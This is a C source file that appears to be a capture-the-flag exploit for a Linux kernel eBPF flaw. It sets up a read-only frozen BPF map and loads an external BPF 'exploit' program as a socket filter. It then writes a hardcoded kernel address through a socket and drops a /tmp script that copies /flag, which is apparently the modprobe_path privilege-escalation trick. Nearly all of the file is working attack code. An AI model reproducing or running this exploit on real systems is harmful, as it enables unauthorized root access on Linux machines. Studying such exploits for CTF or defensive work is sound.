#define _GNU_SOURCE
#include "bpf_insn.h"
// #include <bpf/bpf.h>
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/bpf.h>
#include <poll.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <unistd.h>

#define try(expr)                                                              \
    ({                                                                         \
        int _i = (expr);                                                       \
        if (0 > _i) {                                                          \
            errx(1, "error at %s:%d: returned %d, %s\n", __FILE__, __LINE__,   \
                 _i, strerror(errno));                                         \
        }                                                                      \
        _i;                                                                    \
    })

#define warn(expr)                                                             \
    ({                                                                         \
        int _i = (expr);                                                       \
        if (0 > _i) {                                                          \
            printf("pwn: error at %s:%d: returned %d, %s\n", __FILE__,         \
                   __LINE__, _i, strerror(errno));                             \
        }                                                                      \
        _i;                                                                    \
    })

#define BPF_LOG_BUF_SIZE (UINT32_MAX >> 8)
char bpf_log_buf[BPF_LOG_BUF_SIZE];
static int bpf_program_load(enum bpf_prog_type prog_type,
                            const struct bpf_insn *insns, int prog_len,
                            const char *license, int kern_version) {

    union bpf_attr attr = {
        .prog_type = prog_type,
        .insns = (uint64_t)insns,
        .insn_cnt = prog_len / sizeof(struct bpf_insn),
        .license = (uint64_t)license,
        .log_buf = (uint64_t)bpf_log_buf,
        .log_size = BPF_LOG_BUF_SIZE,
        .log_level = 10,
    };
    attr.kern_version = kern_version;
    bpf_log_buf[0] = 0;
    return syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));
}
static int bpf_create_map(enum bpf_map_type map_type, int key_size,
                          int value_size, int max_entries) {

    union bpf_attr attr = {.map_type = map_type,
                           .key_size = key_size,
                           .value_size = value_size,
                           .max_entries = max_entries};
    return syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));
}

static int bpf_create_rdonly_map(enum bpf_map_type map_type, int key_size,
                                 int value_size, int max_entries) {

    union bpf_attr attr = {.map_type = map_type,
                           .key_size = key_size,
                           .value_size = value_size,
                           .max_entries = max_entries,
                           .map_flags = BPF_F_RDONLY_PROG};
    return syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));
}

static int bpf_update_elem(int fd, void *key, void *value, uint64_t flags) {
    union bpf_attr attr = {
        .map_fd = fd,
        .key = (uint64_t)key,
        .value = (uint64_t)value,
        .flags = flags,
    };
    return syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}
static int bpf_lookup_elem(int fd, void *key, void *value) {
    union bpf_attr attr = {
        .map_fd = fd,
        .key = (uint64_t)key,
        .value = (uint64_t)value,
    };
    return syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));
}
static int bpf_map_freeze(int fd) {
    union bpf_attr attr;
    memset((void *)&attr, 0, sizeof(attr));
    attr.map_fd = fd;
    return syscall(__NR_bpf, BPF_MAP_FREEZE, &attr, sizeof(attr));
}

#include "probe.h"

int main() {
    // create readonly bpf map
    int map_fd = try(bpf_create_rdonly_map(BPF_MAP_TYPE_ARRAY, 4, 8, 1));
    printf("map_fd = %d\n", map_fd);

    char other_val[4000];
    memset(&other_val, 0, sizeof(other_val));
    int other = try(bpf_create_map(BPF_MAP_TYPE_ARRAY, 4, sizeof(other_val), 1));
    printf("map_fd = %d\n", other);

    // put value in map
    int key = 0;
    long value = 0;
    try(bpf_update_elem(map_fd, &key, &value, 0));
    try(bpf_map_freeze(map_fd));

    try(bpf_update_elem(other, &key, &other_val, 0));

    struct bpf_insn *exploit = (struct bpf_insn *)&zig_out_probe_bin;
    int exploit_len = zig_out_probe_bin_len;
    int progfd = bpf_program_load(BPF_PROG_TYPE_SOCKET_FILTER, exploit,
                                  exploit_len, "", 0);
    printf("log = %s\n", bpf_log_buf);
    printf("progfd = %d\n", progfd);

    int sockets[2];
    try(socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets));
    try(setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd,
                   sizeof(progfd)));

    long buffer[4];
    buffer[1] = 0xffffffff82b3f6c0;
    ssize_t n = write(sockets[0], buffer, sizeof(buffer));
    printf("written = %ld\n", n);
    n = read(sockets[1], buffer, sizeof(buffer));
    printf("read = %ld\n", n);

    int fd = open("/tmp/x", O_CREAT | O_RDWR, 0777);
    char payload[] = "#!/bin/sh\ncp /flag /tmp/flag\nchmod 777 /tmp/flag\n";
    write(fd, &payload, sizeof(payload));
    close(fd);

    fd = open("/tmp/t", O_CREAT | O_RDWR, 0777);
    long nulls[1];
    memset(&nulls, 0, sizeof(nulls));
    write(fd, &nulls, sizeof(nulls));
    close(fd);

    system("/tmp/t");

    return 0;
}